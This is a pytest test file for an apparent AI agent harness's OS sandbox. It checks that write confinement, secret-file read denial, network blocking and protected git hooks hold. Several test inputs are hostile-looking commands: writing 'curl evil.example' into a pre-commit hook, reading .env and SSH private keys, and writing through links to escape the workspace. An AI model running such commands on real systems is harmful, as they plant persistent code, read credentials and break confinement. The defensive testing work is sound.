"""The OS sandbox: shared policy, platform backends, and real macOS confinement."""

import json
import sys
from pathlib import Path

import pytest

from conftest import call, make_ctx
from tinyharness.sandbox import BACKENDS, SandboxPolicy, SandboxRuntime, Seatbelt, setup_hint
from tinyharness.sandbox.seatbelt import profile
from tinyharness.security import public_path_regexes, secret_path_regexes
from tinyharness.tools.bash import BashTool

# ---- the policy ----


def test_native_seatbelt_is_preferred_when_macos_has_both_backends():
    assert (Seatbelt, SandboxRuntime) == BACKENDS


def test_missing_sandbox_has_platform_specific_setup_help(monkeypatch):
    monkeypatch.setattr("tinyharness.sandbox.sys.platform", "linux")
    assert "bubblewrap" in setup_hint() and "sandbox-runtime" in setup_hint()
    monkeypatch.setattr("tinyharness.sandbox.sys.platform", "win32")
    assert "Git Bash" in setup_hint() and "windows-install" in setup_hint()


def test_project_policy_uses_private_scratch_temp_and_tool_caches(tmp_path):
    root = tmp_path / "proj"
    scratch = root / ".tinyharness" / "tmp" / "s1"
    cache = tmp_path / "cache"
    policy = SandboxPolicy.for_project(root, scratch=scratch, cache_dir=cache)
    real = root.resolve()
    assert real in policy.write_roots and scratch.resolve() in policy.write_roots
    assert cache.resolve() in policy.write_roots and cache.is_dir()
    assert Path("/tmp").resolve() not in policy.write_roots
    assert set(policy.protected) == {real / ".tinyharness", real / ".git/hooks", real / ".git/config"}
    assert policy.reopened() == (scratch.resolve(),)  # scratch sits under the protected .tinyharness
    assert policy.env["UV_CACHE_DIR"] == str(cache.resolve() / "uv")
    assert policy.env["PLAYWRIGHT_BROWSERS_PATH"] == str(cache.resolve() / "playwright")
    assert policy.env["HF_HOME"] == str(cache.resolve() / "huggingface")
    assert policy.env["TMPDIR"] == str(scratch.resolve() / "tmp")
    assert (scratch / "tmp").is_dir()
    assert not policy.allow_localhost


def test_sandbox_runtime_translates_the_shared_policy(tmp_path, monkeypatch):
    executable = tmp_path / "srt"
    executable.touch()
    monkeypatch.setattr("tinyharness.sandbox.srt.shutil.which", lambda name: str(executable))
    root = tmp_path / "project"
    protected = root / ".git/hooks"
    policy = SandboxPolicy(
        write_roots=(root,),
        project_roots=(root,),
        protected=(protected,),
        allowed_hosts=("assets.example.com",),
        allow_localhost=True,
    )
    backend = SandboxRuntime(tmp_path / "settings")
    wrapped = backend.wrap(["python", "build.py"], policy)
    settings = json.loads(Path(wrapped[2]).read_text())

    assert wrapped[:2] == [str(executable), "--settings"] and wrapped[3:5] == ["--", "python"]
    assert settings["network"]["allowedDomains"] == ["assets.example.com"]
    assert settings["network"]["allowLocalBinding"] is True
    assert settings["filesystem"]["allowWrite"] == [str(root)]
    assert settings["filesystem"]["denyWrite"] == [str(protected)]
    assert any(path.endswith("/.ssh") for path in settings["filesystem"]["denyRead"])
    assert f"{root}/**/.env" in settings["filesystem"]["denyRead"]
    assert f"{root}/**/.env.example" in settings["filesystem"]["allowRead"]
    assert (Path(wrapped[2]).stat().st_mode & 0o777) == 0o600


def test_sandbox_runtime_requires_a_posix_shell_on_windows(monkeypatch):
    monkeypatch.setattr("tinyharness.sandbox.srt.sys.platform", "win32")
    monkeypatch.setattr(
        "tinyharness.sandbox.srt.shutil.which",
        lambda name: "C:/npm/srt.cmd" if name == "srt" else None,
    )
    assert not SandboxRuntime.available()


def test_sandbox_runtime_requires_its_linux_helpers(monkeypatch):
    monkeypatch.setattr("tinyharness.sandbox.srt.sys.platform", "linux")
    present = {"srt", "bwrap", "socat", "rg"}
    monkeypatch.setattr(
        "tinyharness.sandbox.srt.shutil.which",
        lambda name: f"/usr/bin/{name}" if name in present else None,
    )
    assert SandboxRuntime.available()
    present.remove("socat")
    assert not SandboxRuntime.available()


def test_extra_write_dirs_are_protected_like_the_project(tmp_path):
    other = tmp_path / "other"
    policy = SandboxPolicy.for_project(tmp_path / "proj", extra_write=[other])
    assert other.resolve() in policy.write_roots
    assert other.resolve() / ".git/hooks" in policy.protected


def test_secret_reads_can_be_opted_out_of(monkeypatch):
    assert any(".env" in r for r in secret_path_regexes())
    monkeypatch.setenv("TINYHARNESS_ALLOW_SECRET_READS", "1")
    assert secret_path_regexes() == ()


# ---- the Seatbelt profile ----


def _policy(root: Path, **kw) -> SandboxPolicy:
    root = root.resolve()
    return SandboxPolicy(write_roots=(root,), protected=(root / ".git/hooks",), **kw)


def test_profile_denies_network_and_writes_then_allows_the_roots(tmp_path):
    text = profile(_policy(tmp_path))
    assert text.index("(deny network*)") < text.index("(deny file-write*)")
    assert text.index("(deny file-write*)") < text.index(f'(subpath "{tmp_path.resolve()}")')
    assert "localhost" not in text
    assert "(deny appleevent-send)" in text and "launchservicesd" in text


def test_profile_protected_paths_come_after_the_roots_they_are_in(tmp_path):
    text = profile(_policy(tmp_path))
    allow = text.index(f'(subpath "{tmp_path.resolve()}")')
    assert text.index(f'(subpath "{tmp_path.resolve() / ".git/hooks"}")') > allow


def test_profile_localhost_is_opt_in(tmp_path):
    assert '(remote ip "localhost:*")' in profile(_policy(tmp_path, allow_localhost=True))


def test_profile_quotes_paths(tmp_path):
    odd = tmp_path / 'a "quoted" dir'
    assert r"a \"quoted\" dir" in profile(_policy(odd))


# ---- the real thing (macOS only) ----

needs_seatbelt = pytest.mark.skipif(
    sys.platform != "darwin" or not Seatbelt.available(), reason="needs macOS sandbox-exec"
)


@pytest.fixture
def ws(tmp_path):
    ws = tmp_path / "ws"
    (ws / ".git" / "hooks").mkdir(parents=True)
    return ws


async def sandboxed(ws: Path, command: str, **policy) -> str:
    # Not for_project: pytest's tmp_path is inside the temp dir, which that policy makes writable.
    root = ws.resolve()
    policy.setdefault("deny_read", secret_path_regexes())
    policy.setdefault("protected", (root / ".tinyharness", root / ".git/hooks", root / ".git/config"))
    tool = BashTool(Seatbelt(), SandboxPolicy(write_roots=(root,), **policy))
    return await call(tool, {"command": command, "timeout": 30}, make_ctx(ws))


@needs_seatbelt
async def test_the_default_project_policy_is_a_valid_profile(tmp_path):
    policy = SandboxPolicy.for_project(
        tmp_path, scratch=tmp_path / ".tinyharness/tmp/s", cache_dir=tmp_path / "c"
    )
    out = await call(BashTool(Seatbelt(), policy), {"command": "echo hi"}, make_ctx(tmp_path))
    assert out == "hi"


@needs_seatbelt
async def test_writes_only_inside_the_project(ws, tmp_path):
    out = await sandboxed(ws, f"touch inside.txt && touch {tmp_path / 'outside.txt'}")
    assert (ws / "inside.txt").exists()
    assert not (tmp_path / "outside.txt").exists()
    assert "Operation not permitted" in out and "(exit code 1)" in out


@needs_seatbelt
async def test_reads_anything_but_secrets(ws, tmp_path):
    (tmp_path / "notes.txt").write_text("public")
    (ws / ".env").write_text("TOKEN=hunter2")
    ssh = Path.home() / ".ssh"  # the fake HOME from conftest
    ssh.mkdir(parents=True)
    (ssh / "id_ed25519").write_text("PRIVATE KEY")
    out = await sandboxed(ws, f"cat {tmp_path / 'notes.txt'}; cat .env; cat {ssh / 'id_ed25519'}")
    assert "public" in out
    assert "hunter2" not in out and "PRIVATE KEY" not in out


@needs_seatbelt
async def test_env_templates_stay_readable_and_secrets_stay_visible_to_stat(ws):
    (ws / ".env").write_text("TOKEN=hunter2")
    (ws / ".env.example").write_text("TOKEN=your-token-here")
    out = await sandboxed(ws, "cat .env.example; ls -a; cat .env", allow_read=public_path_regexes())
    assert "your-token-here" in out and ".env\n" in out  # listed...
    assert "hunter2" not in out  # ...but not readable


@needs_seatbelt
async def test_no_network(ws):
    script = "import socket; socket.create_connection(('1.1.1.1', 443), timeout=5); print('LEAK' + 'ED')"
    out = await sandboxed(ws, f'{sys.executable} -c "{script}"')
    assert "LEAKED" not in out and "PermissionError" in out


@needs_seatbelt
@pytest.mark.parametrize("allow", [False, True])
async def test_localhost_only_when_allowed(ws, allow):
    script = (
        "import socket; s = socket.socket(); s.bind(('127.0.0.1', 0)); s.listen(); "
        "socket.create_connection(s.getsockname(), timeout=5); print('LOOP' + 'BACK')"
    )
    out = await sandboxed(ws, f'{sys.executable} -c "{script}"', allow_localhost=allow)
    assert ("LOOPBACK" in out) == allow


@needs_seatbelt
@pytest.mark.parametrize("target", [".git/hooks/pre-commit", ".git/config", ".tinyharness/hooks.toml"])
async def test_files_that_run_code_outside_the_sandbox_are_read_only(ws, target):
    (ws / ".tinyharness").mkdir()
    await sandboxed(ws, f"echo 'curl evil.example' > {target}")
    assert not (ws / target).exists()


@needs_seatbelt
async def test_scratch_under_tinyharness_stays_writable(ws):
    scratch = (ws / ".tinyharness" / "tmp" / "s1").resolve()
    scratch.mkdir(parents=True)
    root = ws.resolve()
    policy = SandboxPolicy(write_roots=(root, scratch), protected=(root / ".tinyharness",))
    command = f"touch {scratch}/ok; touch .tinyharness/hooks.toml"
    await call(BashTool(Seatbelt(), policy), {"command": command}, make_ctx(ws))
    assert (scratch / "ok").exists()
    assert not (ws / ".tinyharness" / "hooks.toml").exists()


@needs_seatbelt
async def test_links_cannot_write_outside(ws, tmp_path):
    outside = tmp_path / "outside.txt"
    outside.write_text("original")
    await sandboxed(ws, f"ln {outside} hard; echo pwned >> hard; ln -s {outside} soft; echo pwned >> soft")
    assert outside.read_text() == "original"


@needs_seatbelt
async def test_cannot_hand_work_to_launchservices(ws):
    out = await sandboxed(ws, "/usr/bin/open -g -j -a Calculator && echo OPENED")
    assert "OPENED" not in out


@needs_seatbelt
async def test_tests_can_read_their_own_fake_secrets_and_nothing_else(tmp_path):
    """A project's tests make fake auth.json and .env files in pytest's temp root and
    must read them back; the same names anywhere else stay unreadable."""
    import tempfile

    (tmp_path / "auth.json").write_text('{"fake": "key-in-a-test"}')
    elsewhere = Path(tempfile.mkdtemp(prefix="not-pytest-"))
    try:
        (elsewhere / "auth.json").write_text('{"real": "hunter2"}')
        policy = SandboxPolicy.for_project(tmp_path, cache_dir=tmp_path / "c")
        out = await call(
            BashTool(Seatbelt(), policy),
            {"command": f"cat {tmp_path / 'auth.json'}; cat {elsewhere / 'auth.json'}"},
            make_ctx(tmp_path),
        )
        assert "key-in-a-test" in out
        assert "hunter2" not in out
    finally:
        (elsewhere / "auth.json").unlink()
        elsewhere.rmdir()
